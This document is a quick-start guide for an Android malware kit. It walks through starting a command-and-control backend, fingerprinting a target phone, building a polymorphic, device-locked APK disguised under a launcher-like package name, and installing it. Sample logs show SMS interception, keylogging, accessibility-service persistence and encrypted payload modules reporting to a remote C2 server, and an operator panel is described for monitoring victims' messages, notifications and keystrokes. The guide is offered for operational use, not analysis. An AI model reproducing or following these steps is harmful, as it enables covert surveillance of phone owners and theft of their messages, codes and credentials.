# Quick Start Guide

## Prerequisites

```bash
# Android SDK & NDK
export ANDROID_SDK_ROOT=~/Android/Sdk
export ANDROID_NDK_ROOT=~/Android/Sdk/ndk/25.1.8937393

# Rust
rustup target add aarch64-linux-android

# Build tools
sudo apt install -y rustup cargo gradle jdk-11-openjdk python3-pip
pip3 install pycryptodome
```

## Step 1: Start C2 Backend (5 minutes)

```bash
cd backend/

# Build
cargo build --release

# Initialize database
sqlite3 c2.db < sql/schema.sql

# Start Docker stack (or run locally)
cd ../config
docker-compose up -d

# Verify
curl http://localhost:3000/api/dashboard/test
# Should return: {"status":"ok"}
```

## Step 2: Generate Target Device Fingerprint

On your target Android device:

```bash
adb shell getprop ro.serialno
adb shell settings get secure android_id
adb shell getprop ro.build.fingerprint
adb shell getprop ro.hardware
adb shell getprop ro.build.device
adb shell getprop ro.product.manufacturer
```

Or use PolymorphicBuilder to auto-detect:

```bash
cd android/
kotlin PolymorphicBuilder.kt --detect-device
```

## Step 3: Build Unique APK (10 minutes)

```bash
python3 tools/module_builder.py \
    --base-project android/ \
    --output-dir build/ \
    --campaign-id "mytest" \
    --device-fingerprint "abc123def456..." \
    --device-model "OnePlus 9" \
    --manufacturer "OnePlus" \
    --api-level 33 \
    --c2-endpoints "http://your-c2-server:8080"

# Output: build/app_mytest_signed.apk
```

## Step 4: Test on Device (5 minutes)

```bash
# Install
adb install build/app_mytest_signed.apk

# Verify startup
adb logcat | grep "CoreService"
# [CoreService] Initialization complete

# Check environment validation
adb logcat | grep "Device fingerprint"
# [CoreService] Device fingerprint valid - payload authorized

# Verify modules loaded
adb logcat | grep "SMS_MODULE"
# [SMS_MODULE] [+] SMS interception started
```

## Step 5: Operator Panel

```bash
# Access dashboard
open http://localhost:3000

# View connected devices
# Send commands
# Monitor SMS/notifications/keylog
# Check module status
```

## Testing

```bash
# Run test harness
python3 tools/test_harness.py \
    --apk build/app_mytest_signed.apk \
    --c2-server http://localhost:8080

# Output:
# [+] Deployment: PASSED
# [+] Service Startup: PASSED
# [+] C2 Connectivity: PASSED
# [+] Accessibility Persistence: PASSED
# [+] Keylogger Module: PASSED
# ... (9 tests total)
```

## Troubleshooting

**APK won't install**
```bash
# Check if app already installed
adb shell pm list packages | grep mytest
# Uninstall first
adb uninstall com.oppo.launcher.a1b2c3d4
```

**Device fingerprint doesn't match**
```bash
# Re-generate with correct device properties
adb shell getprop ro.serialno
# Use exact value in builder
```

**C2 not connecting**
```bash
# Check C2 server running
curl http://your-c2-server:8080/api/status
# Check device logcat
adb logcat | grep C2Manager
# Check firewall
sudo ufw allow 8080
```

**Modules not loading**
```bash
# Check encrypted assets exist
unzip -l build/app_mytest_signed.apk | grep modules
# Should show: modules/sms_encrypted.bin, etc.
# Check logcat
adb logcat | grep "ModuleLoader"
```

---

**From zero to operational in 30 minutes.**

Questions? See full docs in `docs/` directory.
